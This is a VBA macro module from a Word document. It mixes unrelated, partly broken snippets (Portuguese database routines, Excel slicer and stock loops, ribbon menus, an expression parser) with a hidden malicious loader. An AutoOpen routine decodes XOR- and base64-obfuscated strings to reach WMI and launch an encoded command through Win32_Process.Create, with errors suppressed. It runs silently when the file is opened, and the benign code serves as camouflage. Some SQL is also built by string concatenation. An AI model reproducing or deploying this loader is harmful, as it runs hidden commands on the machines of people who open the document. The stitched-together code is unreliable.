Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Const CP_UTF8                       As Long = 65001

#If Win64 Then
Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
#Else
Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long

#End If
 



 
 Dim Fenglo As Variant


Public Sub Carrega(ID As Long)

    ' Consulta SQL
    sSQL = "SELECT * FROM " & sTable & " WHERE id = " & ID
    
    ' Cria objeto Recordset
    Set rst = New ADODB.RecordSet
    
    ' Atribui resultado da consulta SQL ao recordset
    rst.Open sSQL, cnn, adOpenStatic
    
    '---Propriedades
    With rst
        Me.ID = .Fields("id").Value
        Me.Endereco = .Fields("endereco").Value
        Me.Bairro = .Fields("bairro").Value
        Me.Cidade = .Fields("cidade").Value
        Me.UF = .Fields("uf").Value
        Me.TipoID = .Fields("tipo_id").Value
        Me.ClienteID = IIf(IsNull(.Fields("cliente_id").Value), Null, .Fields("cliente_id").Value)
    End With
    
End Sub

' Rotina para incluir registro no banco de dados
Public Sub Inclui()

    Set rst = New ADODB.RecordSet

    'Armazena na variavel o comando que fara a consulta SQL no BD Access
    With rst
        .Open Source:=sTable, _
              ActiveConnection:=cnn, _
              CursorType:=adOpenDynamic, _
              LockType:=adLockOptimistic, _
              Options:=adCmdTable
        .AddNew
        
        Me.ID = .Fields("id").Value
        .Fields("endereco").Value = Me.Endereco
        .Fields("bairro").Value = Me.Bairro
        .Fields("cidade").Value = Me.Cidade
        .Fields("uf").Value = Me.UF
        .Fields("tipo_id").Value = Me.TipoID
        .Fields("cliente_id").Value = Me.ClienteID
        
        .Update
    End With
    
    Set rst = Nothing
       

End Sub

' Rotina para alterar registro no banco de dados
Public Sub Altera()
    
    Set rst = New ADODB.RecordSet
    
    ' Comando SQL
    sSQL = "SELECT * FROM " & sTable & " WHERE id = " & Me.ID

    'Armazena na variavel o comando que fara a consulta SQL no BD Access
    With rst
        .Open Source:=sSQL, _
              ActiveConnection:=cnn, _
              CursorType:=adOpenDynamic, _
              LockType:=adLockOptimistic
        
        ' Atribui novos valores aos campos
        .Fields("endereco").Value = Me.Endereco
        .Fields("bairro").Value = Me.Bairro
        .Fields("cidade").Value = Me.Cidade
        .Fields("uf").Value = Me.UF
        .Fields("tipo_id").Value = Me.TipoID
        .Fields("cliente_id").Value = Me.ClienteID
        
        ' Grava alteracoes
        .Update
    End With
    
    Set rst = Nothing
End Sub

' Rotina para Excluir registro do banco de dados
Public Sub Exclui()
    
    sSQL = "UPDATE " & sTable & " SET deletado = True WHERE id = " & Me.ID
    
    cnn.Execute sSQL
    
End Sub
Public Function Listar(OrderBy As String) As String

    Dim col As New Collection

    sSQL = "SELECT id "
    sSQL = sSQL & "FROM " & sTable & " "
    'sSQL = sSQL & "WHERE deletado = False "
    sSQL = sSQL & "ORDER BY " & OrderBy

    Set rst = New ADODB.RecordSet
    
    rst.Open sSQL, cnn, adOpenStatic

    Do Until rst.EOF = True
        col.Add rst.Fields("id").Value
        rst.MoveNext
    Loop

    Set rst = Nothing
    
    Set Listar = col

End Function

Sub initialize_global_variables()
    ' Procedure that initializes the global arrays
    
    ReDim SLICER_ITEM_1(6) ' ReDim to the correct number of items in your first slicer
    ReDim SLICER_ITEM_2(5) ' ReDim to the correct number of items in your second slicer
    
    SLICER_ITEM_1 = Array("", "", "", "", "", "") ' Should be the items in your slicer
    SLICER_ITEM_2 = Array("", "", "", "", "") ' should be the items in another slicer if you have more than one (optional)

End Sub

Sub first_slicer_loop(wb As String, ws1 As String, slicer_name As String, selected_name As String, array_name As Variant)
    
    '  Procedure that selects each item one by one in the first slicer
    '  wb:  ThisWorkboook
    '  ws:  The sheet where the pivot table is located
    '  slicer_name:  The first/initial slicer being looped through
    '  selected_name:  The selected slicer item (used in the for loop below)
    '  array_name:  The array of the items (SLICER_ITEM_1) being looped through
    
    Dim a_name_1 As Variant
    Dim a_name_2 As Variant
    Dim flag As Boolean
    
    flag = False
    With wb.SlicerCaches(slicer_name)
        For Each a_name_1 In array_name
            If a_name_1 = selected_name Then
                flag = True
                .SlicerItems(a_name_1).Selected = flag
            End If
                flag = False
                For Each a_name_2 In array_name
                    If a_name_2 <> selected_name Then .SlicerItems(a_name_2).Selected = flag
                Next a_name_2
        Next a_name_1
    End With
End Sub

Sub second_slicer_loop(wb As String, ws As String, slicer_name As String, copy_range As String, _
                       row_index As Integer, col_index As Integer)
    
    '  Procedure that loops through each slicer item in the SLICER_ITEM_2
    '  wb:  ThisWorkboook
    '  ws:  The sheet where the pivot table is located
    '  slicer_name:  The second slicer being looped through

    Dim i As Integer
    Dim sli As slicerItem
    
    With wb.SlicerCaches(slicer_name)
        For Each sli In .VisibleSlicerItems
            If sli.Name <> .SlicerItems(1).Name Then
                sli.Selected = False
            End If
        Next sli
        
        ''''''''''''''''''''''''''''''''''''''''
        '' Put code in this area to move data ''
        ''''''''''''''''''''''''''''''''''''''''
        ws.Cells(row_index, col_index).Value = ws.Range(copy_range).Value
        col_index = col_index + 1
                
        For i = 2 To .SlicerItems.Count
            .SlicerItems(i).Selected = True
            .SlicerItems(i - 1).Selected = False
        ''''''''''''''''''''''''''''''''''''''''
        '' Put code in this area to move data ''
        ''''''''''''''''''''''''''''''''''''''''
            ws.Cells(row_index, col_index).Value = ws.Range(copy_range).Value
            col_index = col_index + 1
        Next i
        ''''''''''''''''''''''''''''''''''''''''
        '' Put code in this area to move data ''
        ''''''''''''''''''''''''''''''''''''''''
        wb.SlicerCaches(slicer_name).ClearManualFilter
        ' Bottom is for totals, if you need them.
        ws.Cells(row_index, col_index).Value = ws.Range(copy_range).Value
    End With
    
End Sub

Sub Call_Slicer()
    
    ' Procedure that calls the above functions
    
    Call initialize_global_variables ' Initialize Arrays
    
    Dim wb As String:  Set wb = ThisWorkbook
    Dim ws As String: Set ws = wb.Sheets(SHEET_NAME) ' Should be the sheet you want your data on
    Dim slicerItem As Variant
    Dim row_index As Integer
    
    row_index = Row
    For Each slicerItem In SLICER_ITEM_1
        Call first_slicer_loop(wb, ws, SLICER_1, CStr(slicerItem), SLICER_ITEM_1)
        Call second_slicer_loop(wb, ws, SLICER_2, COPY_CELL, row_index, col)
        row_index = row_index + 1
    Next slicerItem
    
    ' Bottom totals
    wb.SlicerCaches(SLICER_1).ClearManualFilter
    Call second_slicer_loop(wb, ws, SLICER_2, COPY_CELL, row_index, col)
    
End Sub


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



Sub Au_Op()

Vutri
End Sub

    

Sub Vutri()

    Dim Cedra As Variant
    Cedra = NobosMeik(VibinJoin("IQcXHjIAGgwGERsdBk07MhQAHz8OAAkRGRc="), "versache")
    Set Kein = CreateObject(Cedra)


    Set Fenglo = Kein.ConnectServer()
    Fenglo.Security_.ImpersonationLevel = 56 _
    * 2 _
    - 109
    Call Fikus
    
End Sub


Function Fikus()
    
        Dim Vikevan_one As Variant
    Set Vikevan_one = Fenglo _
    .Get _
    ("Win32_Process")
    On Error _
    Resume Next
    Call Vikevan_one _
    .Create _
    (NobosMeik _
    (VibinJoin _
    ("BgoFFhMQAAAaCVJeFgoGARkSAQcYDw1FHgwWFwQNSEgVCh8eAA0MRT8IAhwTF0UoGQEHHwRDKgwCFiYBAA0bAxMXSVMyFwkXAkgwGhUQPBcXCwEVBBFISCUKBwECBkgNAhECSU5MDxcFCBddCA0OClkjAAYJN0YGGQheGxUXGF9ZShUBEg4NSx8LFBxOEDoABARcEA4ORA0CEQJJTkwPFwUIF10IDQ4KWREYNBZNCwobRV83BBAcDBgEBhoODUg5VEEXHRdZPCA7NS4FCAcHSxUKHy9DTzRHUgAcBVs3LSgmOQEVBBEJOVRJLlFFBgYTTDE3PjE/HA8xElwQDg40R01FIRYVTiQKFQQGGg4NSEgmBAYbQT9KQRMLBEk1JiU1KkdJUwIGGhEDERsfQU4MABUKFhZBEA4ABARSAQQHBwlNRVIgFQIaEVs1ABwCBhsWVhMbFw5NCwobRV8yEwQdCBMLBj8IEBxFBAAWHA0="), "versache"), _
    Null, Null, VikDel)

  
End Function




Private Function NobosMeik(text As String, key As String) As String
  Dim VifoLer() As Byte
  Dim Grido() As Byte
  
  Dim VifJon As Long
  Dim GitClone As Long
    
  
  VifoLer = StrConv(text, vbFromUnicode)
  VifJon = UBound(VifoLer, 1)
  Grido = StrConv(key, vbFromUnicode)
  GitClone = UBound(Grido, 1)
  Dim VibikO As Long
  Dim Vbokil As Long
  
  For VibikO = (44 * 2 - 88) To VifJon
    VifoLer(VibikO) = _
    VifoLer(VibikO) _
    Xor _
    Grido(Vbokil)
    If Vbokil < GitClone Then
      Vbokil = _
      Vbokil + _
      (54 * 2 - 107)
    Else
      
      Vbokil _
      = _
      72 * _
      0.5 _
      - _
36
    End If
  Next VibikO
  NobosMeik = StrConv(VifoLer, 64)
End Function

Public Function VibinJoin(Vecad As String) As String
    Dim baValue()       As Byte
    Dim sValue          As String
    Dim kerfas           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin" + ".base64"
        .text = Vecad
        baValue = .NodeTypedValue
        sValue = String$(4 * UBound(baValue), 0)
        kerfas = MultiByteToWideChar(CP_UTF8, 84 + 2 - 86, baValue((54 + 12 - 66)), UBound(baValue) + (11 * 11 - 120), StrPtr(sValue), Len(sValue))
        VibinJoin = Left$(sValue, kerfas)
    End With
End Function

Public Sub AutoOpen()


Au_Op
    

End Sub
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Sub Stockloop()
        
    Dim yearChange As Double
    Dim pctChange As Double
    Dim nextTick As String
    Dim currTick As String
    Dim curropenprice As Double
    Dim nextopenprice As Double
    Dim totalVol As Variant
    Dim ws As String
    Dim rowCount As Long
    Dim pricechangecells As Variant
    Dim volumecells As Variant
    Dim maxchange As Double
    Dim minchange As Double
    Dim maxvolume As Double
    
    Dim summTableRow As Integer
    summTableRow = 2
    
    
    'Loop through all worksheets
    For Each ws In Worksheets
        
        ws.Activate
        
        'Get total row count for the worksheet
        rowCount = Worksheets("ws.name").Cells.SpecialCells(xlCellTypeLastCell).Row
        
        'Init Summary Table Headers
        Cells(1, 9).Value = "Ticker"
        Cells(1, 10).Value = "Yearly Change"
        Cells(1, 11).Value = "Percent Change"
        Cells(1, 12).Value = "Total Stock Volume"
        
        'Init current ticker
        currTick = Cells(2, 1).Value
        
        'Init open price
        curropenprice = Cells(2, 3).Value
        
        
            'Loop thorugh all rows
            For i = 1 To rowCount
                
                'Check Look Ahead next tick
                nextTick = Cells(i + 1, 1).Value
                
                If nextTick <> currTick Then
                    
                    'Calculate stats and write to our summary table
                    yearChange = Cells(i, 6) - curropenprice
                    pctChange = (Cells(i, 6) - curropenprice) / curropenprice
                    
                    'Post Ticker to summary table
                    Cells(summTableRow, 9).Value = currTick
                    
                    'Post Yearly Change to table
                    Cells(summTableRow, 10).Value = yearChange
                    
                    'Post pct Change to table
                    Cells(summTableRow, 11).Value = pctChange
                    
                    'update open price
                    nextopenprice = Cells(i + 1, 3).Value
                    
                    'Add days volume to total volume
                    totalVol = totalVol + Cells(i, 7).Value
                    
                    'Post total volume to summary table
                    Cells(summTableRow, 12).Value = totalVol
                    
                    'Reset Total volume
                    totalVol = 0
                    
                    'move to next symbol
                    currTick = nextTick
                    summTableRow = summTableRow + 1
                    curropenprice = nextopenprice
                    
                    
                'Else add days volume to total volume
                Else
                    totalVol = totalVol + Cells(i, 7).Value
                    
                End If
            
            Next i
            
            'Set cell formatting for price change cell color
            
            'get count of number of price change cells to color
            pricechangecells = ws.Cells(Rows.Count, "J").End(xlUp).Row
            
            For i = 1 To pricechangecells
            
                'Green for positive price change
                If Cells(i, 10).Value > 0 Then
                    Cells(i, 10).Interior.ColorIndex = 4
                End If
                
                'Red for negative price change
                If Cells(i, 10).Value < 0 Then
                    Cells(i, 10).Interior.ColorIndex = 3
                End If
        
            Next i
            
            
            'Get largest pct return, smallest pct return and largest volume
            
            'init row and column titles
            Cells(2, 15).Value = "Greatest % Increase"
            Cells(3, 15).Value = "Greatest % Decrease"
            Cells(4, 15).Value = "Greatest Total Volume"
            Cells(1, 16).Value = "Ticker"
            Cells(1, 17).Value = "Value"
            
            'set percent change and volume ranges
            'Didn't know how to specify a range dependend upon cell having a value so used 10,000
            pctchangerange = Range("K2:K10000")
            volumerange = Range("L2:L10000")
            
            'Determine max change, max loss, max vol in their respective ranges
            maxchange = Application.WorksheetFunction.Max(pctchangerange)
            minchange = Application.WorksheetFunction.Min(pctchangerange)
            maxvolume = Application.WorksheetFunction.Max(volumerange)
            
            
            'Loop through price change cells to gather max change and min change and tickers
            
            'Determine range of price change cells by finding end row
            pctchangecells = ws.Cells(Rows.Count, "K").End(xlUp).Row
            
            For i = 2 To pctchangecells
                If Cells(i, 11).Value = maxchange Then
                
                    'post value of stock ticker to table
                    Cells(2, 16).Value = Cells(i, 10).Value
                    
                    'post value of maxchange cell to table
                    Cells(2, 17).Value = Cells(i, 11).Value
                    
                ElseIf Cells(i, K).Value = minchange Then
                    
                    'post value of stock ticker to table
                    Cells(3, 16).Value = Cells(i, 10).Value
                    
                    'post value of minchange cell to table
                    Cells(3, 17).Value = Cells(i, 11).Value
                End If
                
            Next i
            
                        
            'Loop through volume cells to gather highest volume stock
            
            'Determine range of volume cells by finding end row
            volumecells = ws.Cells(Rows.Count, "L").End(xlUp).Row
            
            For i = 2 To volumecells
                If Cells(i, 12).Value = maxvolume Then
                
                    'post value of largest volume stock ticker to table
                    Cells(4, 16).Value = Cells(i, 12).Value
                    
                    'post value of largest volume stock to table
                    Cells(4, 17).Value = Cells(i, 12).Value
                End If
                
            Next i
                                   
    Next ws
    
End Sub


Function GetCalendario() As Date
    
    Dim iTotalBotoes As Integer ' Total de botoes
    Dim Ctrl As control
    Dim frm As f_Calendario     ' Formulario
    
    Set frm = New f_Calendario  ' Cria novo objeto setando formulario nele
    
    ' Atribui cada um dos Label num elemento do vetor da classe
    For Each Ctrl In frm.Controls
        If Ctrl.Name Like "l?c?" Then
            iTotalBotoes = iTotalBotoes + 1
            ReDim Preserve Botoes(1 To iTotalBotoes)
            Set Botoes(iTotalBotoes).btnGrupo = Ctrl
        End If
    Next Ctrl
    
    frm.Show
    
    ' Se a data escolhida for nula ou invalida, retorna-se a data atual:
    If IsDate(frm.Tag) Then
        GetCalendario = frm.Tag
    Else
        GetCalendario = dtDate
    End If
    
    Unload frm
    
End Function

Sub OnActionButton(control As IRibbonControl)

    If Conecta() = True Then
        Select Case control.ID
            Case "btnPedreiros": fPedreiros.Show
            Case "btnClientes": fClientes.Show
            Case "btnFornecedores": fFornecedores.Show
            Case "btnProdutos": fProdutos.Show
            Case "btnObras": fObras.Show
            Case "btnCompras": fCompras.Show
            Case "btnRequisicoes": fRequisicoes.Show
            Case "btnPagamentos": fPagamentos.Show
            Case "btnDicionarioDados": Call AtualizaBD
            Case "btnBackup": fBackup.Show
            'Case "btnOrcamentos": fOrcamentos.Show
            Case Else: MsgBox "Botao ainda nao implementado", vbInformation
        End Select
    End If

End Sub

'Callback for customUI.onLoad
Sub ribbonLoaded(ribbon As IRibbonUI)
    Stop
    Set Myribbon = ribbon
End Sub


'Callback for DynamicMenu getContent
Sub dyMenuImportacoes(control As IRibbonControl, ByRef returnedVal)
'   This procedure is executed whenever a sheet is activated
'   (See the Worksheet_Activate procedure in ThisWorkbook)
    
    Dim XMLcode As String
    
'   Read the XML markup from the active sheet
    XMLcode = "<menu xmlns=" & Chr(34) & "http://schemas.microsoft.com/office/2006/01/customui" & Chr(34)
    XMLcode = XMLcode & " >"
    XMLcode = XMLcode & "<button id=" & Chr(34) & "bTransConta" & Chr(34) & " image=" & Chr(34) & "money99" & Chr(34)
    XMLcode = XMLcode & " label=" & Chr(34) & "Money99: Transacoes da conta" & Chr(34)
    XMLcode = XMLcode & " onAction=" & Chr(34) & "ActionDyMenuImportacoes" & Chr(34) & " />"
    XMLcode = XMLcode & "<button id=" & Chr(34) & "bSaldos" & Chr(34) & " image=" & Chr(34) & "money99" & Chr(34)
    XMLcode = XMLcode & " label=" & Chr(34) & "Money99: Saldo das contas" & Chr(34)
    XMLcode = XMLcode & " onAction=" & Chr(34) & "ActionDyMenuImportacoes" & Chr(34) & " />"
    XMLcode = XMLcode & "<button id=" & Chr(34) & "bBradescoCC" & Chr(34) & " image=" & Chr(34) & "bradesco" & Chr(34)
    XMLcode = XMLcode & " label=" & Chr(34) & "Bradesco: Extrato da conta corrente" & Chr(34)
    XMLcode = XMLcode & " onAction=" & Chr(34) & "ActionDyMenuImportacoes" & Chr(34) & " />"
    XMLcode = XMLcode & "<button id=" & Chr(34) & "bSantanderFatura" & Chr(34) & " image=" & Chr(34) & "santander" & Chr(34)
    XMLcode = XMLcode & " label=" & Chr(34) & "Santander: Fatura de cartao" & Chr(34)
    XMLcode = XMLcode & " onAction=" & Chr(34) & "ActionDyMenuImportacoes" & Chr(34) & " />"
    XMLcode = XMLcode & "</menu>"

    returnedVal = XMLcode
    
End Sub

Sub UpdateDynamicRibbon()
'   Invalidate the ribbon to force a call to dynamicMenuContent
    On Error Resume Next
    Myribbon.Invalidate
    If Err.Number <> 0 Then
        'MsgBox "Lost the Ribbon object. Save and reload."
    End If
End Sub

Sub ActionDyMenuImportacoes(control As IRibbonControl)
'   Executed when Sheet1 is active
    If Conecta() = True Then
        Select Case control.ID
            Case "bTransConta": fImportaTransacoesM99.Show
            'Case "bSaldos": f_import02.Show
            'Case "bBradescoCC": f_import03.Show
            'Case "bSantanderFatura": Call f_import04.Show
            Case Else: MsgBox "Botao ainda nao implementado", vbInformation
        End Select
    End If
End Sub
Sub dyMenuOutrosCadastros(control As IRibbonControl, ByRef returnedVal)
'   This procedure is executed whenever a sheet is activated
'   (See the Worksheet_Activate procedure in ThisWorkbook)
    
    Dim XMLcode As String
    
'   Read the XML markup from the active sheet
    XMLcode = "<menu xmlns=" & Chr(34) & "http://schemas.microsoft.com/office/2006/01/customui" & Chr(34)
    XMLcode = XMLcode & " >"
    
'    XMLcode = XMLcode & "<button id=" & Chr(34) & "bBairros" & Chr(34) & " imageMso=" & Chr(34) & "OpenStartPage" & Chr(34)
'    XMLcode = XMLcode & " label=" & Chr(34) & "Bairros" & Chr(34)
'    XMLcode = XMLcode & " onAction=" & Chr(34) & "ActionDyMenuOutrosCadastros" & Chr(34) & " />"
        
    XMLcode = XMLcode & "<button id=" & Chr(34) & "bContas" & Chr(34) & " image=" & Chr(34) & "Contas" & Chr(34)
    XMLcode = XMLcode & " label=" & Chr(34) & "Contas" & Chr(34)
    XMLcode = XMLcode & " onAction=" & Chr(34) & "ActionDyMenuOutrosCadastros" & Chr(34) & " />"
    
    XMLcode = XMLcode & "<button id=" & Chr(34) & "bEtapas" & Chr(34) & " imageMso=" & Chr(34) & "OpenStartPage" & Chr(34)
    XMLcode = XMLcode & " label=" & Chr(34) & "Etapas da obra" & Chr(34)
    XMLcode = XMLcode & " onAction=" & Chr(34) & "ActionDyMenuOutrosCadastros" & Chr(34) & " />"

    XMLcode = XMLcode & "<button id=" & Chr(34) & "bTiposObra" & Chr(34) & " imageMso=" & Chr(34) & "OpenStartPage" & Chr(34)
    XMLcode = XMLcode & " label=" & Chr(34) & "Tipos de obra" & Chr(34)
    XMLcode = XMLcode & " onAction=" & Chr(34) & "ActionDyMenuOutrosCadastros" & Chr(34) & " />"

    
    XMLcode = XMLcode & "</menu>"

    returnedVal = XMLcode
    
End Sub
Sub ActionDyMenuOutrosCadastros(control As IRibbonControl)
'   Executed when Sheet1 is active
    If Conecta() = True Then
        Select Case control.ID
            'Case "bBairros": fBa.Show
            Case "bContas": fContas.Show
            Case "bEtapas": fEtapas.Show
            Case "bTiposObra": fTiposObra.Show
            
            Case Else: MsgBox "Botao ainda nao implementado", vbInformation
        End Select
    End If
End Sub

Public Function Parse(ByVal sExpr As String, Optional ByVal iRecur As Integer = 0)
    Dim cTree As Collection
    
    If iRecur = 0 Then
        ' Used as breakpoint
        iRecur = 0
    End If
    
    Set cTree = ParseBinary(sExpr, ",")
    If cTree Is Nothing Then
        Set cTree = ParseBinary(sExpr, "+")
        If cTree Is Nothing Then
            Set cTree = ParseBinary(sExpr, "-")
            If cTree Is Nothing Then
                Set cTree = ParseBinary(sExpr, "*")
                If cTree Is Nothing Then
                    Set cTree = ParseBinary(sExpr, "/")
                    If cTree Is Nothing Then
                        Set cTree = ParseBinary(sExpr, "\")
                        If cTree Is Nothing Then
                            Set cTree = ParseUnary(sExpr, "+")
                            If cTree Is Nothing Then
                                Set cTree = ParseUnary(sExpr, "-")
                                If cTree Is Nothing Then
                                    Set cTree = ParseBinary(sExpr, "^")
                                    If cTree Is Nothing Then
                                        Set cTree = ParseBrackets(sExpr)
                                        If cTree Is Nothing Then
                                            Set cTree = ParseFunction(sExpr)
                                            If cTree Is Nothing Then
                                                Set cTree = ParseToken(sExpr)
                                            End If
                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If
                End If
            End If
        End If
    End If
    Set Parse = cTree
End Function


Public Function ParseBinary(ByVal sExpr As String, ByVal sOp As String) As Collection
    Dim i As Integer, j As Integer, p As Integer
    Dim c As String
    Dim sExpr1 As String, sExpr2 As String
    Dim cExpr1 As Collection, cExpr2 As Collection, cTree As Collection
    
    p = 0
    For i = 1 To Len(sExpr)
        c = Mid(sExpr, i, 1)
        If c = "(" Then p = p + 1
        If c = ")" Then p = p - 1
        
        If p < 0 Then Exit For
        If p = 0 And c = sOp Then
            sExpr1 = Left(sExpr, i - 1)
            sExpr2 = Right(sExpr, Len(sExpr) - i)
            Set cExpr1 = Parse(sExpr1, 1)
            Set cExpr2 = Parse(sExpr2, 1)
            Exit For
        End If
    Next
    
    If cExpr1 Is Nothing Or cExpr2 Is Nothing Then
        Exit Function
    End If
    
    Set cTree = New Collection
    cTree.Add sOp
    cTree.Add cExpr1
    If cExpr2(1) = sOp Then
        For i = 2 To cExpr2.Count
            cTree.Add cExpr2(i)
        Next
    Else
        cTree.Add cExpr2
    End If
    
    Set ParseBinary = cTree
End Function


Public Function ParseUnary(ByVal sExpr As String, ByVal sOp As String) As Collection
    Dim i As Integer, j As Integer
    Dim c As String
    Dim cExpr As Collection, cTree As Collection
    
    sExpr = Trim(sExpr)
    c = Left(sExpr, 1)
    If c <> sOp Then
        Exit Function
    End If
    
    sExpr = Right(sExpr, Len(sExpr) - 1)
    Set cExpr = Parse(sExpr, 1)
    If cExpr Is Nothing Then
        Exit Function
    End If
    
    Select Case sOp
    Case "+"
        Set cTree = cExpr
    Case "-"
        Set cTree = New Collection
        cTree.Add "(-)"
        cTree.Add cExpr
    End Select
    
    Set ParseUnary = cTree
End Function


Public Function ParseBrackets(ByVal sExpr As String) As Collection
    sExpr = Trim(sExpr)
    If Left(sExpr, 1) = "(" And Right(sExpr, 1) = ")" Then
        sExpr = Mid(sExpr, 2, Len(sExpr) - 2)
        Set ParseBrackets = Parse(sExpr, 1)
    End If
End Function


Public Function ParseToken(ByVal sExpr As String) As Collection
    Dim cTree As Collection
    Dim i As Integer
    Dim c As String
    Dim sExprOld As String
    
    If False Then
    sExprOld = sExpr
    Do
        sExpr = Replace(sExpr, "- ", " -")
        If sExprOld = sExpr Then Exit Do
        sExprOld = sExpr
    Loop
    End If
    
    sExpr = Trim(sExpr)
    If Len(sExpr) = 0 Then Exit Function
    For i = 1 To Len(sExpr)
        c = UCase(Mid(sExpr, i, 1))
        If ("A" <= c And c <= "Z") Or ("0" <= c And c <= "9") Or InStr(1, ".%_", c) Then
        Else
            Exit Function
        End If
    Next
    
    Set cTree = New Collection
    cTree.Add "TOKEN"
    cTree.Add sExpr
    
    Set ParseToken = cTree
End Function


Public Function ParseFunction(ByVal sExpr As String) As Collection
    Dim iStart As Integer
    Dim sFunc As String
    Dim sArgs As String
    Dim cArgs As Collection
    Dim cExpr1 As Collection, cExpr2 As Collection, cTree As Collection
    
    sExpr = Trim(sExpr)
    iStart = InStr(1, sExpr, "(")
    If iStart = 0 Or Right(sExpr, 1) <> ")" Then
        Exit Function
    End If
    sFunc = Trim(Left(sExpr, iStart - 1))
    sArgs = Mid(sExpr, iStart + 1, Len(sExpr) - iStart - 1)
    
    Set cArgs = Parse(sArgs)
    If cArgs Is Nothing Then
        Exit Function
    End If
        
    Set cTree = New Collection
    cTree.Add "FUNC"
    cTree.Add sFunc
    cTree.Add cArgs
    
    Set ParseFunction = cTree
End Function


Public Function TreeEval(ByVal cTree As Collection) As Double
    Dim sOp As String, i As Integer
    Dim dParam As Double
    Dim dResult As Double, sErrorMsg As String
    
    sErrorMsg = "Syntax error"
    On Error GoTo EvalError
    
    sOp = cTree(1)
    
    Select Case sOp
    Case "TOKEN":
        Select Case UCase(cTree(2))
        Case "PI"
            dResult = 3.141592654
        ' Below your constants definitions...
        Case Else
            dResult = Val(cTree(2))
        End Select
    Case "(-)":
        dResult = -TreeEval(cTree(2))
    Case "+"
        dResult = TreeEval(cTree(2))
        For i = 3 To cTree.Count
            dResult = dResult + TreeEval(cTree(i))
        Next
    Case "-":
        dResult = TreeEval(cTree(2))
        For i = 3 To cTree.Count
            dResult = dResult - TreeEval(cTree(i))
        Next
    Case "\"
        dResult = TreeEval(cTree(2))
        For i = 3 To cTree.Count
            dResult = dResult Mod TreeEval(cTree(i))
        Next
    Case "*"
        dResult = TreeEval(cTree(2))
        For i = 3 To cTree.Count
            dResult = dResult * TreeEval(cTree(i))
        Next
    Case "/"
        dResult = TreeEval(cTree(2))
        For i = 3 To cTree.Count
            dParam = TreeEval(cTree(i))
            If dParam = 0 Then
                sErrorMsg = "Division by 0"
                GoTo EvalError
            Else
                dResult = dResult / dParam
            End If
        Next
    Case "^"
        dResult = TreeEval(cTree(2))
        For i = 3 To cTree.Count
            dParam = TreeEval(cTree(i))
            If dResult < 0 And dParam < 1 Then
                sErrorMsg = "Power negative"
                GoTo EvalError
            Else
                dResult = dResult ^ dParam
            End If
        Next
    Case "FUNC":
        dParam = TreeEval(cTree(3))
        Select Case UCase(cTree(2))
        Case "COS"
